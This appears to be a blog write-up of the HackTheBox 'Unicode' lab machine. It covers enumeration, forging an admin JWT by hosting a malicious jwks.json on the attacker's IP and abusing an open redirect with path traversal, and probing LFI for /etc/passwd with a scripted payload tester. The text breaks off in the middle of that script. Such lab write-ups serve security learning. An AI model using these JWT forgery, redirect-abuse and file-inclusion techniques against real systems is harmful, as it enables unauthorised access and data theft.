<!DOCTYPE html><html lang="en" dir="auto"><head><meta charset="utf-8"/><meta http-equiv="x-ua-compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/><meta name="robots" content="index, follow"/><title>HackTheBox Writeup: Unicode | Zebra</title><meta name="keywords" content="cybersecurity,ctf,linux,hackthebox"/><meta name="description" content="Machine that shows interesting attack vectors that came with unicode integration. This taught me what `jku` claims are and decompiling a python binary. Also new `bash` blacklist bypass methods."/><meta name="author" content="Zebra"/><link rel="canonical" href="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><link crossorigin="anonymous" href="/assets/css/stylesheet.523aabfa2b5ee217ac92d035cb44bf463d5d30a14b08f7aa59ccfdbebf4501f8.css" integrity="sha256-Ujqr+ite4hesktA1y0S/Rj1dMKFLCPeqWcz9vr9FAfg=" rel="preload stylesheet" as="style"/><script defer="" crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload="hljs.initHighlightingOnLoad()"></script>
<link rel="icon" href="https://xzebra.dev/images/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="https://xzebra.dev/images/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="https://xzebra.dev/images/favicon-32x32.png"/><link rel="apple-touch-icon" href="https://xzebra.dev/images/apple-touch-icon.png"/><link rel="mask-icon" href="https://xzebra.dev/safari-pinned-tab.svg"/><meta name="msapplication-TileColor" content="#2e2e33"/><link rel="alternate" hreflang="en" href="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox Writeup: Unicode"/><meta property="og:description" content="Machine that shows interesting attack vectors that came with unicode integration. This taught me what `jku` claims are and decompiling a python binary. Also new `bash` blacklist bypass methods."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><meta property="og:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_KpO0NY0.png"/><meta property="article:section" content="blog"/><meta property="article:published_time" content="2021-11-28T11:01:00+07:00"/><meta property="article:modified_time" content="2023-05-13T11:12:00+07:00"/><meta property="og:site_name" content="Zebra"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_shibboleth/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_KpO0NY0.png"/><meta name="twitter:title" content="HackTheBox Writeup: Unicode"/><meta name="twitter:description" content="Machine that shows interesting attack vectors that came with unicode integration. This taught me what `jku` claims are and decompiling a python binary. Also new `bash` blacklist bypass methods."/><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://xzebra.dev/blog/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeup: Unicode","item":"https://xzebra.dev/blog/hackthebox_writeup_unicode/"}]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Writeup: Unicode","name":"HackTheBox Writeup: Unicode","description":"Machine that shows interesting attack vectors that came with unicode integration. This taught me what `jku` claims are and decompiling a python binary. Also new `bash` blacklist bypass methods.","keywords":["cybersecurity","ctf","linux","hackthebox"],"articleBody":"Enumeration We will start with a quick scan:\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 12:59 EET Nmap scan report for 10.129.113.151 Host is up (0.091s latency). Not shown: 98 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA) | 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA) |_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Hackmedia |_http-generator: Hugo 0.83.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds We get some dirs if we scan with gobuster:\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://unicode.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 9294 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/11/28 13:05:24 Starting gobuster in directory enumeration mode =============================================================== /login (Status: 308) [Size: 256] [--\u003e http://unicode.htb/login/] /register (Status: 308) [Size: 262] [--\u003e http://unicode.htb/register/] /upload (Status: 308) [Size: 258] [--\u003e http://unicode.htb/upload/] /redirect (Status: 308) [Size: 262] [--\u003e http://unicode.htb/redirect/] /display (Status: 308) [Size: 260] [--\u003e http://unicode.htb/display/] /pricing (Status: 308) [Size: 260] [--\u003e http://unicode.htb/pricing/] /logout (Status: 308) [Size: 258] [--\u003e http://unicode.htb/logout/] /checkout (Status: 308) [Size: 262] [--\u003e http://unicode.htb/checkout/] /error (Status: 308) [Size: 256] [--\u003e http://unicode.htb/error/] /dashboard (Status: 308) [Size: 264] [--\u003e http://unicode.htb/dashboard/] /internal (Status: 308) [Size: 262] [--\u003e http://unicode.htb/internal/] /debug (Status: 308) [Size: 256] [--\u003e http://unicode.htb/debug/] If we try to access /display we get an unauth error.\nWe see a Google about us button in the main page. This is a redirection like: http://unicode.htb/redirect/?url=google.com It is working like a redirection, so we cannot access to /display with this: http://unicode.htb/redirect/?url=unicode.htb/display\nThe pages are genereated with Hugo, but powered by Flask framework.\nGetting the foothold The login state is stored as a JWT signed with public-private key pair. If we decode the JWT in jwt.io, we can see there is a jku attribute pointing to http://hackmedia.htb/static/jwks.json.\nThe ‚Äújku‚Äù (JWK Set URL) Header Parameter is a URI that refers to a resource for a set of JSON-encoded public keys, one of which corresponds to the key used to digitally sign the JWS (JSON Web Signature).\nIf we add that domain to /etc/hosts, we can visit the page and see the following content:\n{ \"keys\": [ { \"kty\": \"RSA\", \"use\": \"sig\", \"kid\": \"hackthebox\", \"alg\": \"RS256\", \"n\": \"AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs\", \"e\": \"AQAB\" } ] } We will generate a new RSA key pair with the following commands:\nopenssl genrsa -out keypair.pem 2048 openssl rsa -in keypair.pem -pubout -out publickey.crt openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out private.key Once this is done, we can get the n and e keys for our own jku:\nfrom Crypto.PublicKey import RSA fp = open(\"publickey.crt\", \"r\") key = RSA.importKey(fp.read()) fp.close() print(\"n:\", hex(key.n)) print(\"e:\", hex(key.e)) We can download the jku found in hackmedia.htb and update the n and e fields with the ones from the script.\nNow we can serve our own jku with some http server, like:\npython -m http.server 8080 After that, we update the jku field in jwt.io with our own (http://10.10.14.35:8080/jwks.json).\nWe get the following error:\njku validation failed But we are not receiving any request to our HTTP server. This might be caused by a domain restriction or something, but we can try with the redirect in the main page. http://hackmedia.htb/redirect/?url=http://10.10.14.35:8080/jwks.json And it fails again. I ended up trying the following and I got the request: http://hackmedia.htb/static/../redirect?url=10.10.14.35:8080/jwks.json\nBut no luck accessing the dashboard, we are redirected to the login. It looks like the encoding of the original jwks.json is not hex as the script I got from the blog post.\nRFC 7518: JSON Web Algorithms (JWA) https://www.rfc-editor.org/rfc/rfc7518#section-6.3.1.1 The ‚Äún‚Äù (modulus) parameter contains the modulus value for the RSA public key. It is represented as a Base64urlUInt-encoded value.\nIf we google a bit more, we can find a python library for doing that task:\nGet the big-endian byte sequence of integer in Python Based on this post: How to return RSA key in jwks_uri endpoint for OpenID Connect Discovery I need to base64url-encode the octet value of this two numbers: n = https://stackoverflow.com/questions/30784217/get-the-big-endian-byte-sequence-of-integer-in-python After changing the script to this:\nimport jwkest from Crypto.PublicKey import RSA fp = open(\"publickey.crt\", \"r\") key = RSA.importKey(fp.read()) fp.close() print(\"n:\", jwkest.long_to_base64(key.n)) print(\"e:\", jwkest.long_to_base64(key.e)) I could craft a JWT with username admin and login to the admin dashboard. If we look at the Saved reports section, the urls look like the following: http://hackmedia.htb/display/?page=monthly.pdf\nThis remind me an LFI. If we try to inject /etc/passwd, we get a 404. As the name of the machine suggets, we can try to use unicode to bypass it.\nI wrote a script to test all the possible unicode representation for chars / and .:\nimport requests def send_payload(payload, encoder) -\u003e bool: encoded_payload = encoder(payload) res = requests.get(f\"http://hackmedia.htb/display/?page={encoded_payload}\", cookies={ \"auth\": \"\", }) return not res.text.startswith(\"","wordCount":"1751","inLanguage":"en","image":"https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_KpO0NY0.png","datePublished":"2021-11-28T11:01:00+07:00","dateModified":"2023-05-13T11:12:00+07:00","author":{"@type":"Person","name":"Zebra"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xzebra.dev/blog/hackthebox_writeup_unicode/"},"publisher":{"@type":"Organization","name":"Zebra","logo":{"@type":"ImageObject","url":"https://xzebra.dev/images/favicon.ico"}}}</script></head><body id="top"><header class="header"><nav class="nav"><ul id="menu" style="margin-left:auto"><li><a href="https://xzebra.dev/" title="whoami"><span>whoami</span></a></li><li><a href="https://xzebra.dev/blog/" title="blog"><span>blog</span></a></li><li><a href="https://xzebra.dev/apps/" title="apps"><span>apps</span></a></li></ul></nav></header><main class="main"><article class="post-single"><header class="post-header"><h1 class="post-title">HackTheBox Writeup: Unicode</h1><div><ul class="post-series"><span class="secondary-text">This post belongs to this series:</span><li><a rel="noopener noreferrer" href="https://xzebra.dev/series/hackthebox/" class="link-highlight" style="--highlight-color:#9fef00">HackTheBox Machines</a></li></ul></div><div class="post-description">Machine that shows interesting attack vectors that came with unicode integration. This taught me what <code>jku</code> claims are and decompiling a python binary. Also new <code>bash</code> blacklist bypass methods.</div><div class="post-meta"><span title="2021-11-28 11:01:00 +0700 +0700">November 28, 2021</span>¬†¬∑¬†9 min¬†¬∑¬†Zebra</div></header><figure class="entry-cover"><img loading="lazy" src="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_KpO0NY0.png" alt=""/></figure><div class="post-content"><h1 id="enumeration">Enumeration<a hidden="" class="anchor" aria-hidden="true" href="#enumeration">#</a></h1><p>We will start with a quick scan:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-11-28 12:59 EET
</span></span><span style="display:flex"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.113.151
</span></span><span style="display:flex"><span>Host is up <span style="color:#f92672">(</span>0.091s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex"><span>Not shown: <span style="color:#ae81ff">98</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>| ssh-hostkey:
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">3072</span> fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">256</span> 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_  <span style="color:#ae81ff">256</span> c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_http-title: Hackmedia
</span></span><span style="display:flex"><span>|_http-generator: Hugo 0.83.1
</span></span><span style="display:flex"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.45 seconds
</span></span></code></pre></div><p>We get some dirs if we scan with <code>gobuster</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>Gobuster v3.1.0
</span></span><span style="display:flex"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://unicode.htb
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exclude Length:          <span style="color:#ae81ff">9294</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>2021/11/28 13:05:24 Starting gobuster in directory enumeration mode
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>/login                <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 256<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/login/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/register             <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 262<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/register/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/upload               <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 258<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/upload/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/redirect             <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 262<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/redirect/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/display              <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 260<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/display/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/pricing              <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 260<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/pricing/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/logout               <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 258<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/logout/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/checkout             <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 262<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/checkout/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/error                <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 256<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/error/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/dashboard            <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 264<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/dashboard/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/internal             <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 262<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/internal/<span style="color:#f92672">]</span>
</span></span><span style="display:flex"><span>/debug                <span style="color:#f92672">(</span>Status: 308<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 256<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://unicode.htb/debug/<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>If we try to access <code>/display</code> we get an unauth error.</p><p>We see a <em>Google about us</em> button in the main page. This is a
redirection like: <a href="http://unicode.htb/redirect/?url=google.com">http://unicode.htb/redirect/?url=google.com</a> It is
working like a redirection, so we cannot access to <code>/display</code> with this:
<a href="http://unicode.htb/redirect/?url=unicode.htb%2Fdisplay">http://unicode.htb/redirect/?url=unicode.htb/display</a></p><p>The pages are genereated with Hugo, but powered by <strong>Flask</strong> framework.</p><h1 id="getting-the-foothold">Getting the foothold<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-foothold">#</a></h1><p>The login state is stored as a JWT signed with public-private key pair.
If we decode the JWT in <code>jwt.io</code>, we can see there is a <code>jku</code> attribute
pointing to <a href="http://hackmedia.htb/static/jwks.json">http://hackmedia.htb/static/jwks.json</a>.</p><blockquote><p>The ‚Äújku‚Äù (JWK Set URL) Header Parameter is a URI that refers to a
resource for a set of JSON-encoded public keys, one of which
corresponds to the key used to digitally sign the JWS (JSON Web
Signature).</p></blockquote><p>If we add that domain to <code>/etc/hosts</code>, we can visit the page and see the
following content:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span>{
</span></span><span style="display:flex"><span>    <span style="color:#f92672">&#34;keys&#34;</span>: [
</span></span><span style="display:flex"><span>        {
</span></span><span style="display:flex"><span>            <span style="color:#f92672">&#34;kty&#34;</span>: <span style="color:#e6db74">&#34;RSA&#34;</span>,
</span></span><span style="display:flex"><span>            <span style="color:#f92672">&#34;use&#34;</span>: <span style="color:#e6db74">&#34;sig&#34;</span>,
</span></span><span style="display:flex"><span>            <span style="color:#f92672">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;hackthebox&#34;</span>,
</span></span><span style="display:flex"><span>            <span style="color:#f92672">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;RS256&#34;</span>,
</span></span><span style="display:flex"><span>            <span style="color:#f92672">&#34;n&#34;</span>: <span style="color:#e6db74">&#34;AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs&#34;</span>,
</span></span><span style="display:flex"><span>            <span style="color:#f92672">&#34;e&#34;</span>: <span style="color:#e6db74">&#34;AQAB&#34;</span>
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>    ]
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>We will generate a new RSA key pair with the following commands:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>openssl genrsa -out keypair.pem <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex"><span>openssl rsa -in keypair.pem -pubout -out publickey.crt
</span></span><span style="display:flex"><span>openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out private.key
</span></span></code></pre></div><p>Once this is done, we can get the <code>n</code> and <code>e</code> keys for our own <code>jku</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>fp <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;publickey.crt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
</span></span><span style="display:flex"><span>key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>importKey(fp<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex"><span>fp<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>print(<span style="color:#e6db74">&#34;n:&#34;</span>, hex(key<span style="color:#f92672">.</span>n))
</span></span><span style="display:flex"><span>print(<span style="color:#e6db74">&#34;e:&#34;</span>, hex(key<span style="color:#f92672">.</span>e))
</span></span></code></pre></div><p>We can download the <code>jku</code> found in <code>hackmedia.htb</code> and update the <code>n</code>
and <code>e</code> fields with the ones from the script.</p><p>Now we can serve our own <code>jku</code> with some http server, like:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>python -m http.server <span style="color:#ae81ff">8080</span>
</span></span></code></pre></div><p>After that, we update the <code>jku</code> field in <code>jwt.io</code> with our own
(<a href="http://10.10.14.35:8080/jwks.json">http://10.10.14.35:8080/jwks.json</a>).</p><p>We get the following error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">jku</span> <span style="color:#a6e22e">validation</span> <span style="color:#a6e22e">failed</span>
</span></span></code></pre></div><p>But we are not receiving any request to our HTTP server. This might be
caused by a domain restriction or something, but we can try with the
redirect in the main page.
<a href="http://hackmedia.htb/redirect/?url=http%3A%2F%2F10.10.14.35%3A8080%2Fjwks.json">http://hackmedia.htb/redirect/?url=http://10.10.14.35:8080/jwks.json</a>
And it fails again. I ended up trying the following and I got the
request:
<a href="http://hackmedia.htb/static/../redirect?url=10.10.14.35%3A8080%2Fjwks.json">http://hackmedia.htb/static/../redirect?url=10.10.14.35:8080/jwks.json</a></p><p>But no luck accessing the dashboard, we are redirected to the login. It
looks like the encoding of the original <code>jwks.json</code> is not hex as the
script I got from the blog post.</p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://www.rfc-editor.org/rfc/rfc7518#section-6.3.1.1"><div><div class="bookmark-title">RFC 7518: JSON Web Algorithms (JWA)</div><div class="bookmark-description"></div><div class="bookmark-link"><div>https://www.rfc-editor.org/rfc/rfc7518#section-6.3.1.1</div></div></div><div class="bookmark-image"></div></a></div><blockquote><p>The ‚Äún‚Äù (modulus) parameter contains the modulus value for the RSA
public key. It is represented as a Base64urlUInt-encoded value.</p></blockquote><p>If we google a bit more, we can find a python library for doing that
task:</p><p></p><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://stackoverflow.com/questions/30784217/get-the-big-endian-byte-sequence-of-integer-in-python"><div><div class="bookmark-title">Get the big-endian byte sequence of integer in Python</div><div class="bookmark-description">Based on this post: How to return RSA key in jwks_uri endpoint for OpenID Connect Discovery
I need to base64url-encode the octet value of this two numbers:
n =</div><div class="bookmark-link"><div>https://stackoverflow.com/questions/30784217/get-the-big-endian-byte-sequence-of-integer-in-python</div></div></div><div class="bookmark-image"><img src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded" alt="" loading="lazy"/></div></a></div>After changing the script to this:<p></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#f92672">import</span> jwkest
</span></span><span style="display:flex"><span><span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>fp <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;publickey.crt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
</span></span><span style="display:flex"><span>key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>importKey(fp<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex"><span>fp<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>print(<span style="color:#e6db74">&#34;n:&#34;</span>, jwkest<span style="color:#f92672">.</span>long_to_base64(key<span style="color:#f92672">.</span>n))
</span></span><span style="display:flex"><span>print(<span style="color:#e6db74">&#34;e:&#34;</span>, jwkest<span style="color:#f92672">.</span>long_to_base64(key<span style="color:#f92672">.</span>e))
</span></span></code></pre></div><p>I could craft a JWT with username <code>admin</code> and login to the admin
dashboard. If we look at the <em>Saved reports</em> section, the urls look like
the following: <a href="http://hackmedia.htb/display/?page=monthly.pdf">http://hackmedia.htb/display/?page=monthly.pdf</a></p><p>This remind me an LFI. If we try to inject /etc/passwd, we get a 404. As
the name of the machine suggets, we can try to use unicode to bypass it.</p><p>I wrote a script to test all the possible unicode representation for
chars <code>/</code> and <code>.</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_payload</span>(payload, encoder) <span style="color:#f92672">-&gt;</span> bool:
</span></span><span style="display:flex"><span>    encoded_payload <span style="color:#f92672">=</span> encoder(payload)
